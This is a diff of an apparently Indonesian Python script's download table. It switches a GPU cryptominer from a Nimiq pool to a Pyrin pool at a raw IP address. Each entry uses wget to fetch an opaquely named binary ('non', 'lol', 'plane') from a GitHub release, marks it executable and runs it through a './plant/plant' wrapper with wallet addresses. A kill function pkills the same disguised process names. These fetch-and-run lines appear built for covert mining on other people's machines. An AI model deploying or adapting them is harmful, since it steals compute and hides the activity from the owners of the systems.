@@ -38,12 +38,19 @@ downloads = {
         ]
     },
     "gpu": {
-        "link": "./plant/plant wget -q https://github.com/handevproject/starterpack/releases/download/1.0.2/non",
+        "link": "./plant/plant wget -q https://github.com/handevproject/starterpack/releases/download/1.0.0/lol",
         "run": [
-            "chmod +x non",
-            "./plant/plant ./non -d=0 -a \"NQ389ADBRBMVUAD361F7JYLK105CFU9A0EQS\" -s nimiq.icemining.ca -p 2053 -n clarksye -t 4 --batchsize=45 -i Disable"
+            "chmod +x lol",
+            "./plant/plant ./lol --algo PYRIN --pool 44.204.71.134:80 --tls on --user pyrin:qpw6m4gsf4zjceusefcx02fw6t6jv3qlt6dmfmkjdd59fm2569gwvs3e8dg3w.clarksye"
         ]
     },
+    # "gpu": {
+    #     "link": "./plant/plant wget -q https://github.com/handevproject/starterpack/releases/download/1.0.2/non",
+    #     "run": [
+    #         "chmod +x non",
+    #         "./plant/plant ./non -d=0 -a \"NQ389ADBRBMVUAD361F7JYLK105CFU9A0EQS\" -s nimiq.icemining.ca -p 2053 -n clarksye -t 4 --batchsize=45 -i Disable"
+    #     ]
+    # },
     "cpu": {
         "link": "./plant/plant wget -q https://github.com/handevproject/starterpack/releases/download/1.0.1/plane",
         "run": [
@@ -54,7 +61,7 @@ downloads = {
 }
 
 def kill_processes():
-    process_list = ['plant', 'plant-local', 'non', 'plane']
+    process_list = ['plant', 'plant-local', 'lol', 'plane']
     # Menggabungkan daftar proses menjadi satu string dengan pemisah "|"
     process_string = "|".join(process_list)
     # Menjalankan perintah pkill dengan opsi -f untuk mencocokkan semua pola sekaligus
